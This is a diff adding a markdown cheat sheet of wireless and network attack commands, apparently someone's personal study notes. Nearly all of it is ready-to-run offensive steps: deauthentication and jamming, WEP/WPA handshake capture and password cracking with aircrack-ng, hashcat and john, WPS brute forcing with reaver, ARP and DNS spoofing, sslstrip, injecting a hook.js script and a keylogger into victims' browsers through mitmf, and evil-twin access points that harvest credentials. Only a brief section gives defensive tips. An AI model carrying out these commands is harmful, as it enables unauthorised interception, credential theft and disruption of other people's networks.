@@ -1,0 +1,412 @@
+#Wireless Attacks
+
+##Changing to monitor mode:
+iwconfig						//to view all the wireless connections
+ifconfig wlan0 down
+airmon-ng check kill			//kill all the process that may interfere later on
+iwconfig wlan0 mode monitor/airmon-ng start wlan0		//changing to monitor mode
+ifconfig wlan0 up
+
+##Getting the info of wireless networks:-
+airodump-ng wlan0mon
+
+##Getting the info of particular wireless networks:-
+airodump-ng --bssid [bssid] --channel [c] --write [filename] wlan0mon
+
+##Deauthenticating the client to connect again:-
+aireplay-ng --deauth [packet number] -a [router mac] -c [client mac] wlan0mon
+
+
+
+
+
+#WEP Cracking:-(wired equivalent privacy)(Not in use much right now)
+When we have data increasing:-aireplay is not required
+aircrack -ng [cap file] -------------key found
+remove the semicolons
+
+When we have data not increasing fast or no client is connected:-
+aireplay-ng --fakeauth 0 -a [router mac] -h [wifi interface mac of ours] wlan0mon
+(Because of the above command we will be assosciated to the above network)
+aireplay-ng --arpreplay -b [router mac] -h [wifi interface mac of ours] wlan0mon
+aireplay-ng --fakeauth 0(this here is the seconds) -a [router mac] -h [wifi interface mac of ours] wlan0mon
+(Because of the above command we will be assosciated to the above network)---assosciation successful
+aircrack-ng [cap file]---------key found
+
+
+
+
+#WPA Cracking:----
+(Only when WPS is enabled) 
+wash --interface wlan0mon				//to check that WPS is enabled or not
+aireplay-ng --fakeauth 30 -a [router mac] -h [wifi interface mac] wlan0mon
+reaver --bssid [router mac] --channel [channel no] --interface wlan0mon -vvv --no-assosciate (reaver tool works on old router)
+
+
+>WPA handshake:-Working method
+(wifi protected access)(uses the encryption RC4/TKIS)
+Do the normal process till the wifi is scanned for a particular network,then next:-
+aireplay-ng --deauth 4 -a [bssid] -c [client_id] wlan0mon					--to send limited packets to get handshake
+aireplay-ng -0 0 -a [bssid] -c [client_id] wlan0mon							--to send unlimited packets to jam the network
+aircrack-ng packets.cap -w /root/rockyou.txt
+and thus the password cracking begins
+and after the attack ----airmon-ng stop wlan0mon; service network-manager restart
+
+**Cracking handshake with the wordlist:-
+aircrack -ng [cap file] -w [wordlist file]
+
+To crack wifi using "john the ripper" we need to first convert the cap file to hccap file
+aircrack-ng handshake.cap -J pulkit							--conversion to hccap file
+hccap2john /root/captohccap.hccap > /root/simple.txt
+john simple.txt													--and this will start decrypting the file and get the password
+
+
+>Creating a wordlist:-
+crunch [min] [max] [characters we want] -o [filename] -t [if any pattern optional]
+eg:-crunch 6 8 abc123$ -o wordlist -t a@@@@@b
+
+ftp://ftp.openwall.com/pub/wordlists/
+http://www.openwall.com/mirrors/
+https://github.com/danielmiessler/SecLists
+http://www.outpost9.com/files/WordLists.html
+http://www.vulnerabilityassessment.co.uk/passwords.htm
+http://packetstormsecurity.org/Crackers/wordlists/
+http://www.ai.uga.edu/ftplib/natural-language/moby/
+http://www.cotse.com/tools/wordlists1.htm
+http://www.cotse.com/tools/wordlists2.htm
+http://wordlist.sourceforge.net/
+
+
+
+##ARP Spoofing(MITM):-
+arpspoof -i [interface] -t [client ip] [gateway ip]
+arpspoof -i [interface] -t [gateway ip] [client ip]
+echo 1 > /proc/sys/net/ipv4/ip_forward				(it will work like router..packets will flow)
+
+Another method:-(Best method)
+install mitmf
+mitmf --arp --spoof --gateway [router ip] --target [client ip] -i [interface]
+and also mitmf starts sslstrip automatically because of which website connection is downgraded to http and thus getting a clear text
+
+
+##DNS Spoofing:
+service apache2 start
+leafpad /etc/mitmf/mitmf.conf
+(Under A nameserver type *.live.com=[ip of the server or remote website])
+mitmf --arp --spoof --gateway [router ip] --target [client ip] -i [interface] --dns
+
+
+
+##Fake access points:-
+apt-get install mana-toolkit
+leafpad /etc/mana-toolkit/hostapd-mana.conf
+leafpad /usr/share/mana-toolkit/run-mana/start-nat-simple.sh
+bash /usr/share/mana-toolkit/run-mana/start-nat-simple.sh
+
+
+
+##Mac changer:-
+To connect to a router that is whitelisting devices we need to spoof the mac address of the client that are already connected to it and thus we can easily bypass the whitelist rule that has been made by the router.
+Helps in protecting wifi network and only allowed mac-address can be connected to wifi network
+mac address(48bit address---MM:MM:MM:SS:SS:SS) and first 3 parts of mac address(manufacturer) and next 3(serial unique)
+>We need to know which mac_address are allowed to be connected to the wifi router and then accordingly change the mac address.All wifi connected devices can be known using airodump-ng tool going with the particular wifi network
+ifconfig eth0 down
+ifconfig eth0 hw ether 00:11:22:33:44:55
+ifconfig eth0 up
+
+OR 
+
+It can be done using "macchanger"
+syntax:-ifconfig wlan0 down
+macchanger -m 11:22:33:44:55:66 wlan0
+ifconfig wlan0 up	
+
+##Wifi related attacks--
+>Deauthentication packets sent to the target so that he is not able to connect to the network
+>Creating a rogue access point with internet access				//read it and create it
+>Fake captive portals	//these are just the websites that are rediected by fake AP so that browser is hooked to the website
+
+
+##Man in the middle framework--
+apt-get install mitmf
+mitmf --arp --spoof --gateway 192.168.1.1 --targets 192.168.1.14 -i wlan0
+
+And this will change the ARP table on the victim computer
+
+Using these plugins we need to install python module "Twisted"
+pip install Twisted=15.5.0
+
+mitmf --arp --spoof --gateway 192.168.1.1 --targets 192.168.1.14 -i wlan0 --screen //screenshot and will save it to var/log/mitmf
+ 
+>Injecting javascript code:-
+--js-file [file name with mitmf commands)
+mitmf --arp --spoof --gateway 192.168.1.1 --targets 192.168.1.14 -i wlan0 --inject --js-url http://192.168.1.14/hook.js
+This will be injected when the user will open any http website and we will hook it in beef
+
+>Capturing the screen and keylogger:
+mitmf --arp --spoof --gateway [router ip] --target [client ip] -i [interface] --screen --jskeylogger
+
+
+
+
+##SSLstrip								//not much useful, as it is already handled by "mitmf"
+echo 1 > /proc/sys/net/ipv4/ip_forward										//we need to set the file to value 1
+cat /proc/sys/net/ipv4/ip_forward											//verifying
+iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080		//setting the ip tables(port redi.)
+iptables -t nat -L PREROUTING												//verifying
+scanning of nmap															//to know the hosts
+arpspoof -i wlan0 -t 192.168.1.1 -r 192.168.1.27
+arpspoof -i wlan0 -t 192.168.1.27 -r 192.168.1.1 (new terminal)
+iptables -I INPUT 1 -p tcp -dport 8080 -j ACCEPT (new terminal)				//open up the port 8080 to get sslstrip listening
+iptables -L INPUT															//verifying	
+sslstrip -l 8080 							//developed by moxie
+tail -f sslstrip.log (new terminal)				//logging the live feed 
+
+
+#Wifi Jammer:-
+aireplay-ng --deauth 20 -a [router ip] -c [client machine ] wlan0mon --ignore-negative-one (for specific client)
+aireplay-ng --deauth 20 -a [router ip]  wlan0mon --ignore-negative-one (for whole network)
+If any error appears that the mon0 is on another channel then we can switch the channel by ifconfig mon0 channel 1
+--ignore-negative-one is just used to ignore the interface channel number
+
+
+
+#Working of Reaver tool:
+WPS feature of router allows us to connect to any device when we click on the button
+It is just 8 no. pin and using bruteforce we can break it is less than 10 hrs
+To see which access points are using WPS feature we can use the tool called "wash" which tells us the provided information
+syntax: wash -i wlan0mon
+
+We use "reaver" tool to break the WPS feature of access points
+syntax:-reaver --bssid 11:22:33:44:55:66 --channel 11 -i wlan0mon
+
+While running reaver there may rise an error which says "Failed to assosciate with <mac address>".
+To fix this we need to manually assosciate the mac address using fakeauth packets
+syntax:-aireplay-ng --fakeauth 100 -a [router_mac] -h [client_mac] wlan0mon
+This will manually initiate the fakeauth packets to the router and thus assosciation will be done and also the reaver syntax will be added:-
+reaver --bssid 11:22:33:44:55:66 --channel 11 wlan0mon -A
+
+If the last pin is only being tried up then we need to send "no nacks" packets and also we can get any problem but we can see it by using -vv (verbose) and try to debug the error
+reaver --bssid 11:22:33:44:55:66 --channel 11 wlan0mon -A --no-nacks
+
+If the WPS get locked then first method is to send deauth packets in a large no. until the user physically restarts the router
+2nd method-We can use the tool "mdk3" to send multiple request from the virtual clients so that router gets flooded and thus router is forced to restart automatically
+syntax:--mdk3 wlan0mon a -a [router mac] -m(for the legitimate client mac address)
+and thus it will send requests from the client and letting it to restart it automatically and we can check again using "wash" that is the wps still locked or not?
+
+Deauth packets are the deauthentication packets that are sent so that the connected clients gets disconnected and then again connects to access points and thus capturing the WPA handshake.It should small and limited.
+
+
+
+
+
+#Saving Cracking Progress:
+john the ripper is used  to store the session and resume it when required.In this way the cracking progress is saved and can be used later on
+syntax:-john --wordlist=rockyou.txt --stdout --session=1stfloor | aircrack-ng -w - -b 11:22:33:44:55:66 handshake01.cap
+In this syntax we specified the wordlist first and then we provided the "stdout" for the standard output and gave the seesion name "1stfloor" and this output goes to the input of aircrack-ng and no wordlist will be defined there and only the mac and the handshake file will be provided..
+Note--Whenever we want to save and quit then we can use the "q" to save the progress and then press "ctrl+c" to quit
+
+To resume the saved progress:--
+Syntax:--john --restore=1stfloor | aircrack-ng -w - -b 11:22:33:44:55:66 handshake01.cap
+In this syntax we pass the parameter restore with the session name "1stfloor" that was defined before and then again pass this output as the input to the aircrack-ng command
+ 
+To get the status of the cracked progress--
+syntax:-john --status=[session_name]
+
+
+
+
+#WPA/WPA2 Enterprise----
+It is an another form of authentication.Each user get their own key to connect to the network.Authentication is managed through a central server(RADIUS server).
+We need to establish Fake WPA Enterprise Access points in order to crack it.
+
+Normal fake Access points can be created using "wifi pumpkin" 						//github repository
+WPA enterprise will be created using "hostapd-wpe" a modified version
+open the configuration file using leafpad /etc/hostapd-wpe/hostapd-wpe.conf
+Set the interface and ssid name
+service network-manager stop
+and just the run the "hostapd-wpe" by hostapd-wpe /etc/hostapd-wpe/hostapd-wpe and will start broadcasting the ssid
+
+We will get the challenge and response as soon as the client tries to connect to it.
+Then we need to crack that using "asleap".
+syntax:--asleap -C [challenge] -R [response] -W [dictionary file]
+
+
+
+
+#Creating wordlist:
+crunch [min no.] [max no. of characters] [characters you want specifically(optional)] -o [output file]
+
+Huge wordlist directly inputing to the aircrack-ng due to more space--(the created wordlist can be upto any size due to which it can take a lot of disk space)
+eg---crunch 8 8 | aircrack-ng -b [bssid] -w - handshake.cap
+
+and Saving this huge wordlist progress also:--(steps)
+crunch 8 8 | john --stdin --session=session1 --stdout | aircrack-ng -b [bssid] -w - handshake1.cap
+
+To resume the saved progress:-
+crunch 8 8 | john --restore=session1 | aircrack-ng -b [bssid] -w - handshake1.cap
+
+
+
+
+#Speeding the process:
+using airolib
+airolib-ng test-db --import passwd wpa_wordlist								--putting down all the wordlist to the database
+echo "1st-floor" > test_essid												--inserting the value of essid to the file name
+airolib-ng test-db --import essid test_essid						--putting down the essid name to the database
+airolib-ng test_db --batch												--this will convert all the passwords to the PMK files
+
+Note:--PMK(Pairwise Master Key) is the key which is always obtained by combination of password and essid and obtaining this only takes time..So we are doing it in advance to speed the crack..Now we will directly input the database to the aircrack-ng.
+
+aircrack-ng -r test_db handshake.cap 				(cracking through database which has PMK's)
+
+
+
+#Using Hashcat:
+To process the task using GPU(as it does better than CPU when comes to repetitive tasks)---
+Hashcat tool is used to crack the password using GPU..Aircrack-ng can't do it
+We need to install the graphics driver for the windows.We will be doing this on windows as graphics driver for linux is not easily available.
+We need to download hashcat binaries from the hascat website.
+We will extract the zip file and copy our wordlist in that folder.
+"cap" file is not read by hashcat tool so we need to convert it into "hccapx". https://hashcat.net/hashcat/
+
+To run hashcat---
+syntax:-hashcat64.exe --help
+>>>>>>>hashcat64.exe -m 2500 -d 1 handshake.hccapx rockyou.txt 			
+("m" and "d" are the options that are already defined in the hashcat tool."m" stands for the no. of the attack we want to perform like WPA/WPA2 or md5 hash or anything. "d" stands for the device that we will be using to crack like CPU or GPU.
+We can even pause and resume in the hashcat tool
+
+
+
+
+
+#Secure the wifi:
+Enable WPA2 
+Create a strong SSID network name and the password 
+Turn off the UPnp(Universal plug and play)
+Enable logging feature of the router admin page
+Use security services always
+
+
+
+
+
+
+
+
+13. Wireless attacks
+iwconfig				//to check the interface name and mode it is in
+
+**To put into monitor mode
+ifconfig wlan0 down
+iwconfig wlan0 mode monitor
+ifconfig wlan0 up
+
+**Working with airmon-ng
+airmon-ng check wlan0
+airmon-ng check kill			//killing all the process that may cause trouble
+
+**Working with airodump
+airodump-ng wlan0				//will start telling the details about the network (bssid, channel no., power and so on)
+airodump-ng -c 2 --bssid [mac address] -w wifi_cracking wlan0			//c(channel) w(write to file)
+After this wpa handshake capturing will start
+
+**We will send deauthentication packets, so that everyone disconnect and then again try to connect
+aireplay-ng -0 0 -a [mac address of router]					//will give deauthentication packets indefinitely
+and just run for few seconds and then ctrl c to stop the deauthentication
+
+and in airodump screen we will get wpa handshake, as soon as we get wpa handshake, we will stop the airodump-ng
+
+
+We will get 4 files, but we need only 1 to crack the password
+".cap" file is needed to crack the password
+
+
+**Cracking the wifi password (using aircrack-ng)  --- uses CPU
+We will be using rockyou wordlist (/usr/share/wordlist)
+To unzip rockyou.txt.gz , gzip -d rockyou.txt.gz
+
+aircrack-ng -w rockyou.txt wifi_cracking.cap
+
+
+**Cracking the wifi password (using hashcat)  --- uses CPU as well as GPU
+It needs file in format of hccapx (we need to convert cap file to hccapx online)
+
+hashcat -a 0 -m 2500 a.hccapx rockyou.txt			a(attack mode) m(which password we are cracking-2500 is the code)
+
+
+
+
+
+>Wifi hacking
+* Monitor mode
+ifconfig wlan0 down
+iwconfig wlan0 mode monitor
+ifconfig wlan0 up
+
+* Deauthenticating devices and grabbing password
+
+airmon-ng check wlan0
+airmon-ng check kill
+
+airodump-ng wlan0     (Pwr lower the better signal)
+airodump-ng -c 11 --bssid 58:D5:6E:DB:06:2B -w balaji_wifi wlan0
+
+*Deauthenticating
+aireplay-ng -0 0 -a 58:D5:6E:DB:06:2B wlan0
+
+U will get the WPA handshake and get the cap file to crack
+
+*Password Cracking (aircrack)
+Rock you password list - /usr/share/wordlists/rockyou.txt.gz   (gzip -d rockyou.txt.gz)
+aircrack-ng -w rockyou.txt balaji.cap
+
+*Password Cracking (hashcat) - It requires hccapx file so convert it online
+hashcat -a 0(attack mode) -m 2500(WPA cracking code) balaji.hccapx rockyou.txt
+
+
+
+
+
+*************************************************************************************************************************
+#Extra
+netdiscover -r [range of ip address] 			//helps you discover connected devices
+eg:-192.168.1.1/24
+
+zenmap and nmap					//network scanner tool
+arp -a							//checking the arp tables
+"xarp" software 				//is used to check whether there is any arp poisoning done or not.
+fluxion tool 					//lets you hack the wifi password by creating the fake access point and captures the passwords
+"ettercap" 						//credentials of Wifi router , but it only work when the other users insert the login credentials
+netstat -nao					//helps you know on which ports you are listening on and which process are running(windows)
+acrylic wifi software			//details the wifi information of the available devices
+kismet 							//A software for capturing wifi devices in a place--war walking,driving (geo-location mapping is 
+								also available),It also provides the logs after getting closed and thus we can view the networks that we scanned
+Crunch tool 					//is used to develop customized wordlist
+wifresti tool 					//of github is used to find the saved password of linux
+"cowpatty"						//works same like aircrack-ng but it creates a hash of each and every password generated and 
+								compares it with the ssid to crack the password.Syntax:-cowpatty -f /root/rockyou.txt -r /root/cowpatty01.cap -s "1st-floor"
+"Hashcat" tool 					//also works same as aircrack-ng but we need to compare the cap file to hccap file first to 
+								provide the input to hashcat tool
+Netattack2 Tool 				//is used to kick the users that are using the wifi and disconnect them from the router (github)
+mdk3 							//used to create fake access points 
+
+lsusb							//command for all usb connections made to the computer
+
+airmong-ng start wlan0			//start the wlan0 monitor mode
+airmon-ng check kill			//kill all process that might interrupt
+
+airodump-ng mon0				//shows all the wifi connections that are available
+airodump-ng --bssid [] -c [] wlan0mon		//for specific wifi
+
+ssid-service set identifier (Public name)	//name upto 32 chars and case sensitive
+
+>Know the Hidden Networks---
+Hidden networks are shown as <length :-> and we need to know what is the SSID name of it
+We need to disconnect the client to the router and when it connects back it will let us know the name of the hidden network
+syntax:-aireplay-ng --deauth 4 -b [router mac] -a [client_mac] wlan0mon
+
+>Whenever we want to connect to the hidden network we need to know the ssid name always and in kali we need to go the option "Connect to Hidden network" option in wifi settings and need to provide the ssid name and password with proper authentication
+
+***********************************************************************************************************************
+#ends
